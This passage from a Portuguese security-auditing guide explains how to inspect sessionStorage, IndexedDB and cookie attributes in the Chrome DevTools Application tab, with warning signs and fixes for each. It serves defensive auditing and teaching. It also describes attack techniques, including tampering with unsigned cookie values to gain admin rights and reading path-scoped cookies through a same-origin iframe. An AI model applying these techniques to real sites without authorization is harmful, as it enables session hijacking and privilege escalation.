- **Comportamento normal**: armazena estado de navegação da aba atual e fica vazio quando uma nova aba independente é aberta.
- **O que seria considerado seguro**: conter apenas estado transitório de UI ou dados não confidenciais do fluxo de navegação atual.
- **O que poderia indicar uma vulnerabilidade**: usar `sessionStorage` acreditando erroneamente que ele é "imune a XSS" para guardar tokens de sessão, senhas temporárias ou códigos de recuperação, ou salvar dados bancários em etapas de formulário sem limpeza após a conclusão.
- **Como investigar o problema**: durante fluxos de login, cadastro ou pagamento, mantenha **Application → Storage → Session storage** aberto e observe se credenciais ou dados sensíveis são gravados entre uma tela e outra.
- **Como corrigir ou prevenir**: manter dados sensíveis de formulários apenas em memória durante a submissão direta via HTTPS **[REQUISITO]** e limpar chaves transitórias com `sessionStorage.removeItem()` assim que o fluxo terminar **[BOA PRÁTICA]**.


---

<a id="s2-2-4"></a>
#### 2.2.4 IndexedDB

O **IndexedDB** (*Indexed Database API* — API de Banco de Dados Indexado, padronizado pelo W3C) é um sistema de banco de dados **NoSQL transacional, assíncrono e orientado a objetos** embutido diretamente no navegador. Ao contrário do `localStorage` (que é síncrono, bloqueia a *thread* principal e só aceita strings pequenas), o IndexedDB foi projetado para armazenar **grandes volumes de dados estruturados** — incluindo objetos JavaScript complexos clonados pelo algoritmo *Structured Clone*, arrays binários (`ArrayBuffer`, `TypedArray`) e arquivos (`Blob`, `File`) — além de ser acessível tanto pela página principal quanto por **Web Workers** e **Service Workers**.

Na aba **Application**, expandir **IndexedDB** dentro do grupo **Storage** permite navegar por toda a hierarquia lógica do banco de dados local: **Databases → Object Stores → Indexes & Records**.

##### Estrutura geral

- **Nome do parâmetro**: **IndexedDB** (Árvore e inspetor do banco de dados IndexedDB no DevTools).
- **O que significa**: representa a interface de inspeção da hierarquia completa do motor IndexedDB no navegador, organizada de forma análoga a bancos de dados orientados a documentos: uma **Origem** (*Storage Key*) pode conter múltiplos **Databases**; cada Database possui uma **Versão** inteira e contém um ou mais **Object Stores** (equivalentes a tabelas ou coleções); cada Object Store armazena **Records** (pares `Key` → `Value`) e pode possuir múltiplos **Indexes** secundários para buscas rápidas, sendo toda leitura ou escrita executada dentro de **Transactions**.
- **Para que serve**: auditar quais bancos de dados locais uma aplicação web ou biblioteca de terceiros (como SDKs — *Software Development Kits* — do Firebase, AWS Amplify, PouchDB ou Dexie.js) criou no navegador, inspecionar os registros paginados, recarregar dados (`Refresh`) e excluir registros individuais ou o banco inteiro.
- **Onde encontrar no DevTools**: aba **Application** → barra lateral esquerda → grupo **Storage** → expandir **IndexedDB**.
- **Exemplo prático**: uma aplicação que usa autenticação de terceiros (ex.: Firebase Auth) frequentemente cria um banco chamado `firebaseLocalStorageDb` dentro do **IndexedDB** em vez de usar `localStorage`, justamente para compartilhar o estado com *Service Workers*.
- **Comportamento normal**: ao modificar dados via aplicação, a visualização do IndexedDB no DevTools **não se atualiza sozinha em tempo real** em todas as versões; é necessário clicar no botão **Refresh database** (ou **Refresh** na barra da tabela) para ver os registros recém-inseridos.
- **O que seria considerado seguro**: usar o IndexedDB para armazenar catálogos públicos, rascunhos não confidenciais ou filas de sincronização offline que não contenham credenciais nem PII sensível sem proteção. **[REQUISITO]** Limpar bancos de dados que contenham informações do usuário no momento do *logout*.
- **O que poderia indicar uma vulnerabilidade**:
  - Armazenar tokens JWT, *Refresh Tokens* ou chaves criptográficas exportáveis dentro de *Object Stores* do IndexedDB (muito comum quando desenvolvedores migram do `localStorage` para o `IndexedDB` achando que "por ser mais complexo, ninguém vai ver" — prática conhecida como *Security through Obscurity*, ou segurança por obscuridade).
  - Persistir mensagens privadas, prontuários ou extratos inteiros no IndexedDB sem limpeza no *logout*.
- **Como investigar o problema**: expanda **IndexedDB** na barra lateral; muitos auditores iniciantes esquecem de olhar o IndexedDB e checam apenas `Cookies` e `Local Storage`. Expanda todos os bancos listados e inspecione seus *Object Stores*.
- **Como corrigir ou prevenir**: nunca armazenar segredos ou tokens de sessão em texto claro no IndexedDB **[RECOMENDAÇÃO]**; destruir o banco local no *logout* com `indexedDB.deleteDatabase('nome_do_banco')` ou header `Clear-Site-Data: "storage"` **[REQUISITO]**.

##### Databases

- **Nome do parâmetro**: **Databases** (Bancos de dados do IndexedDB: nome, origem, *Storage Key* e versão).
- **O que significa**: é o contêiner de nível mais alto dentro de uma origem no IndexedDB. Ao clicar no nome de um banco na barra lateral, o painel principal exibe seus metadados: **Origin** (ex.: `https://loja-ficticia.test`), **Storage key** / **Top-level site**, **Is opaque** (se a origem é opaca), **Version** (número inteiro positivo, como `1`, `2`, que controla migrações de esquema via evento `onupgradeneeded`), **Object stores** (contagem total) e o botão **Delete database** + **Refresh database**.
- **Para que serve**: identificar os bancos existentes na origem, verificar a versão do esquema (*schema version*) e permitir a exclusão manual do banco inteiro durante testes.
- **Onde encontrar no DevTools**: aba **Application** → **Storage** → **IndexedDB** → clicar sobre o nó do banco de dados (ex.: `CatalogoOfflineDB`).
- **Exemplo prático**:

```text
CatalogoOfflineDB
  Origin:          https://loja-ficticia.test
  Top-level site:  https://loja-ficticia.test
  Version:         3
  Object stores:   2
  [Delete database]  [Refresh database]
```

- **Comportamento normal**: cada aplicação mantém um ou poucos bancos com nomes descritivos e versão inteira incremental.
- **O que seria considerado seguro**: bancos criados apenas para a finalidade legítima da aplicação e removidos quando a sessão do usuário termina.
- **O que poderia indicar uma vulnerabilidade**: múltiplos bancos residuais de sessões anteriores de outros usuários no mesmo navegador, ou nomes de bancos que expõem identificadores internos (ex.: `db_usuario_cpf_12345678900`).
- **Como investigar o problema**: selecione o banco em **IndexedDB**, anote o nome e a versão, e teste se clicar em **Sair** na aplicação remove ou esvazia o banco (clicando em **Refresh database** após o logout).
- **Como corrigir ou prevenir**: não incluir PII no nome do banco **[REQUISITO]** e invocar `indexedDB.deleteDatabase()` no encerramento da sessão **[REQUISITO]**.

##### Object Stores

- **Nome do parâmetro**: **Object Stores** (Armazenamentos de Objetos, *keyPath* e *autoIncrement*).
- **O que significa**: um *Object Store* é a estrutura dentro de um banco IndexedDB onde os registros são efetivamente guardados (equivalente a uma tabela SQL ou coleção MongoDB). Cada *Object Store* possui um nome único dentro do banco e define como as chaves primárias (*primary keys*) são geradas ou extraídas:
  - **Key path (`keyPath`)**: define o caminho da propriedade dentro do próprio objeto JavaScript que servirá como chave primária (*in-line key*, por exemplo `keyPath: "id"` ou `"pedido.codigo"`). Se for vazio/nulo, o store usa chaves fora do objeto (*out-of-line keys*).
  - **Auto increment (`autoIncrement`)**: booleano (`true`/`false`) que indica se o navegador deve gerar automaticamente números sequenciais crescentes (`1, 2, 3...`) caso a chave não seja fornecida.
- **Para que serve**: organizar diferentes entidades de dados da aplicação (ex.: `produtos`, `carrinho_offline`, `fila_sincronizacao`) e visualizar seus registros em uma grade com as colunas **#** (índice visual), **Key**, **Key (Key path: ...)** e **Value**.
- **Onde encontrar no DevTools**: aba **Application** → **Storage** → **IndexedDB** → expandir o banco → clicar no nome do *Object Store*.
- **Exemplo prático**: o *Object Store* `pedidos_cache` configurado com `keyPath: "pedidoId"` e `autoIncrement: false` mostra na tabela a coluna `Key (Key path: "pedidoId")` preenchida com `"PED-9001"`.
- **Comportamento normal**: *Object Stores* só podem ser criados, alterados ou removidos dentro de uma transação especial de atualização de versão (`versionchange`, disparada no evento `onupgradeneeded`).
- **O que seria considerado seguro**: *Object Stores* contendo apenas dados públicos ou estritamente necessários para operação offline autorizada, sem misturar credenciais.
- **O que poderia indicar uma vulnerabilidade**: um *Object Store* como `usuarios` ou `sessoes` guardando o objeto completo retornado pela API de login (incluindo tokens de sessão, hashes ou permissões administrativas editáveis no cliente).
- **Como investigar o problema**: clique em cada *Object Store* listado na árvore do IndexedDB, examine o cabeçalho `Key path` e navegue pelos registros usando as setas de paginação (`Start from key`, `Previous page`, `Next page`).
- **Como corrigir ou prevenir**: filtrar os campos do objeto antes de gravá-lo no *Object Store* (armazenando apenas atributos não sensíveis) **[REQUISITO]**.

##### Records

- **Nome do parâmetro**: **Records** (Registros chave-valor estruturados).
- **O que significa**: cada linha armazenada dentro de um *Object Store*. Diferentemente do `localStorage`, o **Value** de um *Record* no IndexedDB não precisa ser serializado manualmente para string JSON: ele guarda nativamente tipos complexos do JavaScript (`Object`, `Array`, `Date`, `Map`, `Set`, `Blob`, `File`, `ArrayBuffer` e até objetos `CryptoKey` da *Web Crypto API*).
- **Para que serve**: inspecionar o conteúdo exato de cada documento/objeto salvo localmente, filtrando a partir de uma chave específica na caixa **Start from key** e expandindo a árvore interativa do objeto na coluna **Value** ou no painel inferior.
- **Onde encontrar no DevTools**: aba **Application** → **Storage** → **IndexedDB** → expandir banco → clicar no *Object Store* → linhas da tabela central.
- **Exemplo prático**:

```text
#  | Key (Key path: "id") | Value
---+----------------------+--------------------------------------------------------
0  | 101                  | {id: 101, nome: "Caderno Universitário", preco: 29.90}
1  | 102                  | {id: 102, nome: "Calculadora Científica", preco: 85.00}
```

- **Comportamento normal**: objetos estruturados legíveis; na barra superior da tabela é possível clicar em **Delete selected** (para apagar um registro) ou **Clear object store** (para esvaziar todos os registros daquele store).
- **O que seria considerado seguro**:
  - Registros sem dados confidenciais em texto claro.
  - **[BOA PRÁTICA]** Quando uma aplicação precisa armazenar uma chave criptográfica da *Web Crypto API* no IndexedDB, ela pode salvar o objeto `CryptoKey` com o atributo **`extractable: false`**: assim, mesmo em caso de XSS, o script invasor não consegue exportar os bytes brutos da chave privada via `crypto.subtle.exportKey()`, embora ainda possa usá-la para assinar/decifrar enquanto estiver na sessão.
- **O que poderia indicar uma vulnerabilidade**:
  - Registros contendo tokens `accessToken`, `refreshToken`, senhas em texto claro, números de documentos (CPF/RG) ou arquivos PDF confidenciais em `Blob` acessíveis sem autenticação.
- **Como investigar o problema**: clique em cada registro da tabela de **Records** e expanda todas as propriedades aninhadas no visualizador de objetos na parte inferior do painel.
- **Como corrigir ou prevenir**: remover tokens e PII dos *Records* **[REQUISITO]**; se o uso de chaves criptográficas locais for indispensável, gerá-las via `window.crypto.subtle` com `extractable: false` **[BOA PRÁTICA]**.

##### Indexes

- **Nome do parâmetro**: **Indexes** (Índices secundários de um *Object Store*).
- **O que significa**: um *Index* é uma estrutura de busca associada a um *Object Store* que indexa os registros por outra propriedade do objeto diferente da chave primária (ex.: buscar produtos por `categoria` ou por `codigoBarras`), podendo impor restrição de unicidade (`unique: true`) ou indexar arrays elemento a elemento (`multiEntry: true`).
- **Para que serve**: permitir consultas rápidas por propriedades secundárias sem precisar varrer (*full scan*) todos os objetos do *Object Store*, e, no DevTools, visualizar os registros ordenados e agrupados pela chave do índice (**Index key** → **Primary key** → **Value**).
- **Onde encontrar no DevTools**: aba **Application** → **Storage** → **IndexedDB** → expandir o banco → expandir o *Object Store* → clicar no subitem do índice.
- **Exemplo prático**: dentro do *Object Store* `produtos`, há um índice `por_categoria` (`Key path: "categoria"`). Ao clicar nele no DevTools, a tabela mostra `Index key: "eletronicos"`, `Primary key: 102` e o `Value` correspondente.
- **Comportamento normal**: reflete automaticamente os mesmos registros do *Object Store* pai que possuem a propriedade indexada definida.
- **O que seria considerado seguro**: índices criados sobre campos não sensíveis com restrições `unique` adequadas à regra de negócio.
- **O que poderia indicar uma vulnerabilidade**: índices criados sobre campos sensíveis (como `por_cpf` ou `por_email`), o que confirma que a aplicação foi desenhada para persistir e consultar PII em massa no cliente.
- **Como investigar o problema**: expanda a seta ao lado de cada *Object Store* para listar todos os **Indexes** declarados pelo desenvolvedor, revelando rapidamente quais propriedades do modelo de dados são consideradas chaves de busca pela aplicação.
- **Como corrigir ou prevenir**: evitar indexar e armazenar PII no cliente **[REQUISITO]**; realizar buscas sobre dados sensíveis exclusivamente no back-end autenticado **[REQUISITO]**.

##### Transactions

- **Nome do parâmetro**: **Transactions** (Transações do IndexedDB: `readonly`, `readwrite`, `versionchange`).
- **O que significa**: no IndexedDB, **nenhuma operação de leitura ou escrita pode ocorrer fora de uma transação**. Uma transação (`IDBTransaction`) agrupa uma ou mais operações sobre um ou mais *Object Stores* garantindo **atomicidade** e consistência: se qualquer operação falhar ou `transaction.abort()` for chamado, todas as alterações daquela transação sofrem *rollback* automático. Existem três modos:
  1. **`readonly`**: permite apenas leitura; múltiplas transações `readonly` podem executar de forma concorrente sobre o mesmo *Object Store*.
  2. **`readwrite`**: permite leitura e gravação; bloqueia acesso de escrita concorrente aos mesmos *Object Stores* no escopo da transação.
  3. **`versionchange`**: transação exclusiva disparada durante `onupgradeneeded` quando a versão do banco aumenta; é a única capaz de criar ou apagar *Object Stores* e *Indexes*.
- **Para que serve**: garantir a integridade dos dados locais contra corrupção por falhas no meio de uma gravação ou concorrência entre a página e um *Service Worker*.
- **Onde encontrar no DevTools**: o efeito das transações é observado atualizando a visualização do *Object Store* (**Refresh**) na aba **Application**, monitorando bloqueios (`onblocked`) na aba [Console](./02c-devtools-console.md#s2-3) ou inspecionando o código de acesso via `db.transaction([...], 'readwrite')` na aba **Sources**.
- **Exemplo prático** (Código completo de criação segura e transação no IndexedDB vs. inspeção no DevTools):

```javascript
// Abrindo (ou criando) o banco 'LojaCatalogoDB' na versão 1
const request = indexedDB.open('LojaCatalogoDB', 1);

// 1. Transação 'versionchange': define o esquema (Object Stores e Indexes)
request.onupgradeneeded = (event) => {
  const db = event.target.result;
  if (!db.objectStoreNames.contains('produtos')) {
    const store = db.createObjectStore('produtos', { keyPath: 'id' });
    store.createIndex('por_categoria', 'categoria', { unique: false });
  }
};

request.onsuccess = (event) => {
  const db = event.target.result;

  // 2. Transação 'readwrite': grava apenas dados públicos (sem tokens ou PII!)
  const tx = db.transaction(['produtos'], 'readwrite');
  const store = tx.objectStore('produtos');

  store.put({ id: 101, nome: 'Livro de Redes', categoria: 'livros', preco: 95.0 });

  tx.oncomplete = () => console.log('Transação concluída com sucesso.');
  tx.onerror = (err) => console.error('Falha na transação (rollback aplicado):', err);
};
```

- **Comportamento normal**: transações no IndexedDB possuem **auto-commit** assim que a fila de requisições da transação fica ociosa no *event loop* (por isso, chamadas assíncronas externas como `await fetch()` no meio de uma transação fazem a transação fechar antes da resposta de rede, lançando `TransactionInactiveError`).
- **O que seria considerado seguro**: abrir transações com o menor privilégio necessário (`readonly` para consultas; `readwrite` apenas para gravações), fechar conexões com `db.close()` antes de excluir o banco no *logout* (para não disparar `onblocked`) e nunca confiar nos dados lidos do IndexedDB sem sanitizá-los ao renderizar no DOM.
- **O que poderia indicar uma vulnerabilidade**:
  - **Self-XSS / Stored DOM XSS via IndexedDB**: a aplicação lê registros do IndexedDB em uma transação `readonly` e os insere diretamente via `element.innerHTML` acreditando que "dados vindos do banco local são confiáveis". Se um atacante poluir o cache/IndexedDB (por exemplo, via resposta de API manipulável ou sincronização entre dispositivos), ocorre XSS armazenado no cliente.
  - Conexões `db` mantidas abertas que impedem (`onblocked`) a execução de `indexedDB.deleteDatabase()` quando o usuário faz *logout*.
- **Como investigar o problema**: no DevTools, abra **Application → IndexedDB**, edite ou insira um registro com caracteres especiais HTML (ex.: `<b>teste</b>`) via Console em uma transação `readwrite`, recarregue a página e observe se o HTML é interpretado sem escape. Teste também se o `deleteDatabase` no *logout* fica bloqueado por conexões ativas em abas ou *Service Workers*.
- **Como corrigir ou prevenir**: sempre fechar a conexão (`db.close()`) ao receber o evento `db.onversionchange` (permitindo que o *logout* apague o banco sem bloqueio) **[BOA PRÁTICA]** e renderizar dados lidos do IndexedDB com `textContent` ou sanitização explícita **[REQUISITO]**.

---

<a id="s2-2-5"></a>
#### 2.2.5 Cookies na aba Application

Os **Cookies HTTP** (especificados na **RFC 6265** e na revisão moderna **RFC 6265bis**) continuam sendo o mecanismo fundamental da web para gerenciamento de sessão, autenticação e estado entre cliente e servidor. Para a teoria de funcionamento dos cabeçalhos `Set-Cookie` e `Cookie`, veja também [Cookies e Sessões](./01a-fundamentos-web-parte1.md#s1).

Ao expandir **Cookies** dentro do grupo **Storage** na barra lateral da aba **Application** e selecionar uma origem (por exemplo, `https://loja-ficticia.test`), o DevTools apresenta uma **tabela detalhada** onde cada linha é um cookie armazenado que aquela página tem visibilidade ou escopo para enviar, e cada coluna representa um **atributo ou metadado** crítico daquele cookie.

Na barra superior da tabela de Cookies, você encontra:
- **Filter**: filtra cookies por nome, valor, domínio ou caminho.
- **Only show cookies with an issue**: caixa de seleção valiosíssima em auditorias que exibe apenas cookies com problemas de configuração ou bloqueados pelo navegador (destacados com fundo amarelo/vermelho), vinculando-os diretamente à aba **Issues**.
- **Clear all cookies / Delete selected cookies**: botões para apagar todos os cookies listados ou apenas o cookie selecionado.
- **Painel inferior (*Cookie Value*)**: exibe o valor completo do cookie selecionado e inclui o checkbox **Show URL-decoded** (que decodifica valores com *percent-encoding*, como `%7B%22id%22%3A1%7D` → `{"id":1}`).

Abaixo, analisamos individualmente cada coluna e atributo da tabela de Cookies no DevTools.

##### Name

- **Nome do parâmetro**: **Name** (Nome do cookie e prefixos de segurança `__Host-` e `__Secure-`).
- **O que significa**: o identificador textual do cookie definido no par `Nome=Valor` do cabeçalho `Set-Cookie`. A especificação moderna (RFC 6265bis) define dois **prefixos de nome com semântica de segurança forçada pelo navegador**:
  - **`__Secure-`**: o navegador **só aceita** gravar um cookie cujo nome comece com `__Secure-` se ele vier acompanhado da flag `Secure` e for definido sobre uma origem segura (HTTPS).
  - **`__Host-`**: é o prefixo mais rigoroso existente para cookies de sessão. O navegador **só aceita** gravar um cookie iniciado por `__Host-` se ele cumprir simultaneamente **quatro exigências**: (1) possuir a flag `Secure`, (2) ser enviado sobre HTTPS, (3) **NÃO** possuir o atributo `Domain` (travando o cookie exclusivamente no *host* exato que o emitiu, impedindo leitura ou sobrescrita por subdomínios), e (4) possuir obrigatoriamente `Path=/`.
- **Para que serve**: identificar a finalidade do cookie (ex.: `__Host-session_id`, `csrf_token`, `preferencia_idioma`) e ativar garantias criptográficas/de escopo no navegador quando usados os prefixos `__Host-` ou `__Secure-`.
- **Onde encontrar no DevTools**: aba **Application** → **Storage** → **Cookies** → `<origem>` → primeira coluna (**Name**).
- **Exemplo prático**:
  - Cookie forte: `__Host-sid`
  - Cookie padrão de framework: `PHPSESSID`, `JSESSIONID`, `connect.sid`, `ASP.NET_SessionId`
- **Comportamento normal**: nomes alfanuméricos curtos sem espaços ou separadores proibidos por HTTP.
- **O que seria considerado seguro**:
  - **[RECOMENDAÇÃO]** Utilizar o prefixo **`__Host-`** para o cookie principal de sessão autenticada (ex.: `__Host-id_sessao`), pois ele protege contra ataques de **Cookie Tossing** (quando um subdomínio comprometido, como `blog-antigo.loja-ficticia.test`, tenta plantar um cookie de sessão válido para o domínio principal `loja-ficticia.test` a fim de realizar *Session Fixation*).
  - **[BOA PRÁTICA]** Alterar o nome padrão do cookie de sessão do framework (`PHPSESSID`, `JSESSIONID`) para um nome genérico com prefixo (`__Host-sess`), evitando expor imediatamente a tecnologia de back-end (*fingerprinting*).
- **O que poderia indicar uma vulnerabilidade**:
  - Cookie de sessão sem o prefixo `__Host-` em uma organização que possui dezenas de subdomínios legados ou de terceiros sob o mesmo domínio raiz.
  - Tentativa de usar `__Host-` junto com `Domain=.loja-ficticia.test` (o navegador rejeitará silenciosamente o cookie e mostrará um alerta na coluna **Name** / aba **Issues**).
- **Como investigar o problema**: ordene a coluna **Name** clicando no cabeçalho, identifique quais cookies mantêm o usuário autenticado (excluindo-os um a um e recarregando a página para ver qual derruba a sessão) e verifique se usam `__Host-`.
- **Como corrigir ou prevenir**: renomear o cookie de sessão para `__Host-session` e garantir a configuração `Secure; Path=/; HttpOnly; SameSite=Lax` (sem atributo `Domain`) **[RECOMENDAÇÃO]**.

##### Value

- **Nome do parâmetro**: **Value** (Valor armazenado no cookie).
- **O que significa**: o conteúdo em texto associado ao nome do cookie, enviado de volta ao servidor em cada requisição subsequente dentro do escopo.
- **Para que serve**: transportar um identificador opaco de sessão (referenciando dados guardados na memória/banco do servidor, como Redis) ou um token autocontido assinado/criptografado.
- **Onde encontrar no DevTools**: aba **Application** → **Storage** → **Cookies** → `<origem>` → coluna **Value** (e painel inferior com checkbox **Show URL-decoded**).
- **Exemplo prático**:
  - Identificador opaco seguro (alta entropia): `f9a8b7c6d5e4f3a2b1c09876543210fedcba9876543210fedcba9876543210ab`
  - Valor inseguro previsível/manipulável: `usuario=maria&admin=0` ou `id_usuario=42`
- **Comportamento normal**: strings opacas geradas por um CSPRNG (*Cryptographically Secure Pseudo-Random Number Generator* — Gerador de Números Pseudoaleatórios Criptograficamente Seguro) com pelo menos 128 bits de entropia (32+ caracteres hexadecimais).
- **O que seria considerado seguro**:
  - **[REQUISITO]** Valores de sessão devem ser gerados por CSPRNG no servidor com alta entropia (mínimo recomendado pela OWASP: 64 bits de entropia efetiva, tipicamente 128 bits ou mais na prática) ou, se forem tokens autocontidos (como JWT), devem ser **assinados criptograficamente** (e criptografados com JWE — *JSON Web Encryption* — caso contenham dados confidenciais).
- **O que poderia indicar uma vulnerabilidade**:
  - **Quebra de Controle de Acesso por manipulação de cookie**: valores em texto claro, URL-encoded ou em Base64 simples contendo `role=user`, `isAdmin=false` ou `user_id=105` sem assinatura criptográfica (HMAC — *Hash-based Message Authentication Code*). Basta o usuário dar duplo clique na coluna **Value** do DevTools, mudar para `role=admin` e recarregar a página para ganhar acesso administrativo!
  - **Desserialização Insegura**: valores que começam com padrões de objetos serializados (ex.: `O:4:"User":...` em PHP, `rO0AB...` em Java Base64 ou `.eJ...` / `gASV...` em Python Pickle sem assinatura).
  - **Exposição de PII ou senha**: guardar CPF, e-mail, nome completo ou a própria senha do usuário dentro do **Value** do cookie.
- **Como investigar o problema**: clique em cada cookie na tabela, marque **Show URL-decoded** no painel inferior e verifique se o valor é Base64 (`atob(...)` no Console) ou JSON legível. Em ambiente autorizado de laboratório, dê duplo clique na célula **Value**, altere um caractere ou campo e recarregue a página para testar se o servidor valida a integridade.
- **Como corrigir ou prevenir**: usar apenas IDs de sessão opacos de alta entropia armazenados no servidor **[RECOMENDAÇÃO]** ou assinar/autenticar criptograficamente qualquer estado mantido no cliente **[REQUISITO]**.

##### Domain

- **Nome do parâmetro**: **Domain** (Escopo de domínio do cookie).
- **O que significa**: define para quais *hosts* (domínios e subdomínios) o navegador enviará o cookie automaticamente nas requisições HTTP. Existe uma diferença crucial especificada na RFC 6265 entre dois tipos de cookies:
  1. **Host-Only Cookie (Atributo `Domain` omitido no `Set-Cookie`)**: quando o servidor de `loja-ficticia.test` envia `Set-Cookie: sid=123; Secure; HttpOnly` **sem** escrever `Domain=...`, o cookie torna-se *host-only*. Ele **só será enviado para `loja-ficticia.test`** e **NÃO** será enviado para `blog.loja-ficticia.test` nem `status.loja-ficticia.test`. Na tabela do DevTools, um cookie *host-only* aparece como `loja-ficticia.test` (sem ponto inicial).
  2. **Domain Cookie (Atributo `Domain` explícito no `Set-Cookie`)**: quando o servidor inclui `Domain=loja-ficticia.test` (ou `.loja-ficticia.test` — nas regras modernas da RFC 6265 o ponto inicial explícito é ignorado e ambos têm o mesmo efeito de incluir subdomínios), o cookie passa a ser enviado para o domínio principal **e para todos os seus subdomínios** (`app.loja-ficticia.test`, `dev.loja-ficticia.test`, `marketing.loja-ficticia.test`). No DevTools, costuma ser exibido com um ponto à esquerda (ex.: `.loja-ficticia.test`) para sinalizar visualmente que abrange subdomínios.
- **Para que serve**: controlar se um cookie deve ficar restrito estritamente ao servidor que o criou ou se precisa ser compartilhado entre múltiplos subdomínios da mesma organização (ex.: SSO — *Single Sign-On* entre `conta.exemplo.test` e `painel.exemplo.test`).
- **Onde encontrar no DevTools**: aba **Application** → **Storage** → **Cookies** → `<origem>` → coluna **Domain**.
- **Exemplo prático**:
  - `loja-ficticia.test` (sem ponto inicial no DevTools) → restrito ao host exato (*Host-Only*).
  - `.loja-ficticia.test` (com ponto inicial no DevTools) → compartilhado com qualquer `*.loja-ficticia.test`.
- **Comportamento normal**: navegadores bloqueiam a definição de cookies para domínios de topo públicos listados na **Public Suffix List** (como `.com`, `.com.br`, `.github.io`), impedindo que `meu-site.github.io` defina um cookie para todos os usuários de `*.github.io`.
- **O que seria considerado seguro**:
  - **[RECOMENDAÇÃO]** Omitir o atributo `Domain` (e usar o prefixo `__Host-`) para cookies de sessão que só precisam funcionar em um único host, aplicando o Princípio do Menor Privilégio.
- **O que poderia indicar uma vulnerabilidade**:
  - Cookie de sessão principal configurado com `Domain=.loja-ficticia.test` quando a empresa possui subdomínios vulneráveis a *Subdomain Takeover* (sequestro de subdomínio via DNS CNAME órfão) ou páginas de marketing em subdomínios com XSS: se o cookie tem `Domain=.loja-ficticia.test`, qualquer subdomínio `*.loja-ficticia.test` receberá o cookie de sessão nas requisições!
- **Como investigar o problema**: observe na coluna **Domain** do DevTools se os cookies de autenticação começam com um ponto (`.dominio.test`). Se começarem, eles estão expostos a todos os subdomínios daquela zona DNS.
- **Como corrigir ou prevenir**: omitir o parâmetro `Domain` no cabeçalho `Set-Cookie` sempre que os subdomínios não precisarem compartilhar a mesma sessão **[RECOMENDAÇÃO]**.

##### Path

- **Nome do parâmetro**: **Path** (Caminho de URL do cookie).
- **O que significa**: indica o prefixo de caminho (*URL path*) que deve existir na URL requisitada para que o navegador inclua o cabeçalho `Cookie`. Por exemplo, `Path=/admin` instrui o navegador a enviar o cookie apenas para `/admin`, `/admin/usuarios`, etc., e não para `/catalogo`.
- **Para que serve**: segmentar cookies por diretório de aplicação no mesmo host (por exemplo, quando múltiplos sistemas legados rodam sob caminhos diferentes como `/erp` e `/portal`).
- **Onde encontrar no DevTools**: aba **Application** → **Storage** → **Cookies** → `<origem>` → coluna **Path**.
- **Exemplo prático**: `Path=/` (válido em todo o host) vs. `Path=/api/v1/auth/refresh` (cookie de *Refresh Token* enviado apenas quando o cliente chama a rota de renovação de token!).
- **Comportamento normal**: a maioria dos cookies utiliza `Path=/`. Uma excelente arquitetura para *Refresh Tokens* é restringir o cookie `refresh_token` com `Path=/api/auth/refresh`, fazendo com que ele não trafegue na rede em 99% das requisições normais da aplicação.
- **O que seria considerado seguro**:
  - **[BOA PRÁTICA]** Restringir `Path` de cookies especiais (como *Refresh Tokens*) ao endpoint específico que os consome.
  - **[IMPORTANTE]** **Não confiar em `Path` como barreira de segurança contra XSS na mesma origem!** Mesmo que um cookie tenha `Path=/admin` (sem `HttpOnly`), um script malicioso rodando em `/blog` (na mesma origem) pode simplesmente criar um `<iframe src="/admin">` oculto e ler `iframe.contentDocument.cookie`, pois ambos pertencem à mesma origem (*Same-Origin Policy* ignora caminhos).
- **O que poderia indicar uma vulnerabilidade**: depender exclusivamente de `Path=/admin` (sem `HttpOnly` ou separação em subdomínios distintos) para isolar uma aplicação crítica de outra aplicação insegura hospedada no mesmo domínio e porta.
- **Como investigar o problema**: verifique a coluna **Path** na tabela de Cookies e avalie se sistemas com níveis de confiança diferentes compartilham a mesma origem apenas separados por pastas.
- **Como corrigir ou prevenir**: isolar aplicações de níveis de segurança distintos em origens/domínios diferentes **[RECOMENDAÇÃO]** e usar `Path` restrito em conjunto com `HttpOnly` para reduzir o tráfego desnecessário de tokens na rede **[BOA PRÁTICA]**.

##### Expires / Max-Age

- **Nome do parâmetro**: **Expires / Max-Age** (Tempo de vida / Expiração do cookie).
- **O que significa**: define até quando o navegador deve manter o cookie armazenado antes de descartá-lo automaticamente:
  - **`Session` (Cookie de Sessão)**: quando o servidor **não** envia nem `Expires` nem `Max-Age`, a coluna no DevTools exibe **`Session`**. Teoricamente, o cookie expira quando a "sessão do navegador" termina (ao fechar todas as janelas do navegador).
  - **`Expires`**: define uma data e hora absolutas no formato UTC (*Coordinated Universal Time*, ex.: `Wed, 21 Oct 2026 07:28:00 GMT`). Depende do relógio do cliente estar correto.
  - **`Max-Age`**: define a duração relativa em **segundos** a partir do recebimento (ex.: `Max-Age=3600` = 1 hora). Se ambos (`Max-Age` e `Expires`) estiverem presentes no `Set-Cookie`, **`Max-Age` tem precedência** segundo a RFC 6265. Para excluir um cookie imediatamente, envia-se `Max-Age=0` (ou uma data `Expires` no passado).
- **Para que serve**: determinar se o cookie é transitório (`Session`) ou persistente (*Persistent Cookie*, gravado em disco pelo tempo especificado, como funcionalidades de *"Lembrar de mim"*).
- **Onde encontrar no DevTools**: aba **Application** → **Storage** → **Cookies** → `<origem>` → coluna **Expires / Max-Age**.
- **Exemplo prático**:
  - Cookie de sessão bancária: `Session` (ou `Max-Age=900` para 15 minutos).
  - Cookie de preferência de tema: `2027-10-30T10:00:00.000Z` (1 ano).
- **Comportamento normal**: cookies de autenticação sensíveis usam `Session` ou expirações curtas; cookies de preferências visuais usam até 400 dias (nota: conforme a RFC 6265bis implementada pelo Chrome, **400 dias é o limite máximo** permitido pelo navegador para `Expires`/`Max-Age`; valores maiores são automaticamente truncados para 400 dias).
- **O que seria considerado seguro**:
  - **[REQUISITO]** Independentemente da data em `Expires / Max-Age` no navegador, **o servidor deve impor a expiração da sessão no lado do servidor** (*idle timeout* por inatividade e *absolute timeout* máximo).
  - **[BOA PRÁTICA]** Definir `Session` ou um `Max-Age` curto para cookies de sessão crítica.
- **O que poderia indicar uma vulnerabilidade**:
  - Cookies de sessão autenticada com validade de meses ou anos (`2030-...`) sem rotação.
  - Confiar que um cookie `Session` sempre será apagado ao fechar o navegador: em navegadores modernos com a opção *"Continuar de onde você parou"* (*Session Restore*) ativada, **cookies `Session` frequentemente sobrevivem ao fechamento e reabertura do navegador!**
- **Como investigar o problema**: cheque a coluna **Expires / Max-Age** dos cookies de autenticação; copie o valor do cookie, faça logout (ou espere o tempo de expiração teórica) e tente reenviar o cookie antigo para verificar se o servidor realmente o invalidou no back-end.
